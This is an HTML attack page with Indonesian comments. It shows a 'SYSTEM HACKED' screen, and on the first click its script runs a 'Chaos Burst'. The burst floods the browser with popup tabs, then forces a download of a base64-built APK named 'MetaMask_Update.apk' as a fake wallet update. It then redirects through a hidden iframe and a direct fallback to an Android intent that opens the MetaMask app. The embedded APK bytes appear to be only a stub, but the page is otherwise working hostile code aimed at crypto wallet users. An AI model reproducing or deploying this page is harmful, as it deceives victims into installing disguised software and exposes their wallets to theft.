<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Critical</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #000; color: #f00; font-family: monospace;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; text-align: center; cursor: pointer; overflow: hidden;
  }
  .panel { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #f00; max-width: 400px; width: 100%; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
  h2 { animation: blink 0.5s infinite; }
  @keyframes blink { 50% { opacity: 0.2; } }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 100px; overflow-y: auto; }
  iframe { display: none; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>☢️ SYSTEM HACKED ☢️</h2>
  <p>Klik di mana saja untuk memulai.</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // TARGET INTENT (METAMASK)
  // ============================================
  var METAMASK_INTENT = "intent://#Intent;" +
                        "package=io.metamask;" +
                        "scheme=metamask;" +
                        "S.browser_fallback_url=" + encodeURIComponent("https://metamask.io/") + ";" +
                        "end;";

  // ============================================
  // TRIGGER (ONE CLICK)
  // ============================================
  document.body.addEventListener('click', function() {
    if (executed) return;
    executed = true;

    document.getElementById('main-card').innerHTML = `
      <h2>EXECUTING...</h2>
      <p>Memulai Chaos Burst...</p>
      <div id="log"></div>
    `;
    logEl = document.getElementById('log');
    log("[!] Chaos Burst Initiated...");

    // ============================================
    // TASK 1: MULTI-TAB FLOODING (ANDROID OPTIMIZED)
    // ============================================
    log("[+] Memulai Multi-Tab Flooding...");
    var tabCount = 0;
    
    // Di Android, popup blocker lebih ketat. Kita harus memicu klik langsung.
    var tabInterval = setInterval(function() {
      try {
        // Buka tab baru (Chrome Android akan membuka tab baru, bukan window baru)
        var win = window.open('about:blank', '_blank');
        if (win) {
          // Isi tab dengan script (opsional)
          win.document.write(`
            <body style="background:#000;color:#f00;font-family:monospace;text-align:center;padding-top:20vh;">
              <h1>SYSTEM COMPROMISED</h1>
              <p>Tab ID: ${tabCount}</p>
            </body>
          `);
          tabCount++;
          log("[+] Tab " + tabCount + " dibuka.");
        } else {
          log("[-] Popup diblokir (Browser Limit).");
          clearInterval(tabInterval);
        }
      } catch(e) {
        clearInterval(tabInterval);
      }

      if (tabCount >= 5) { // Batasi 5 tab agar tidak langsung crash
        clearInterval(tabInterval);
        log("[!] Multi-Tab Flooding Selesai.");
      }
    }, 200); // Setiap 200ms

    // ============================================
    // TASK 2: BLOB APK DOWNLOAD RACE
    // ============================================
    setTimeout(function() {
      log("[+] Memicu APK Download (Kamuflase)...");
      try {
        var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
        var binary = atob(b64Apk);
        var bytes = new Uint8Array(binary.length);
        for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
        
        var blob = new Blob([bytes], { type: "application/vnd.android.package-archive" });
        var url = URL.createObjectURL(blob);
        
        var a = document.createElement("a");
        a.href = url;
        a.download = "MetaMask_Update.apk";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
      } catch(e) {}
    }, 500);

    // ============================================
    // TASK 3: INTENT HIJACK (METAMASK)
    // ============================================
    setTimeout(function() {
      log("[+] Memicu Intent MetaMask...");
      try {
        // Buat iframe sandbox
        var iframe = document.createElement("iframe");
        iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
        iframe.style.display = "none";
        iframe.srcdoc = `
          <!DOCTYPE html>
          <html>
          <body>
            <script>
              window.top.location.href = "${METAMASK_INTENT}";
            <\/script>
          </body>
          </html>
        `;
        document.getElementById("launcher-container").appendChild(iframe);
      } catch(e) {}
      
      // Fallback Top-Level
      setTimeout(function() {
        window.location.href = METAMASK_INTENT;
      }, 100);
      
    }, 1000);

  }, { once: true });

})();
</script>
</body>
</html>
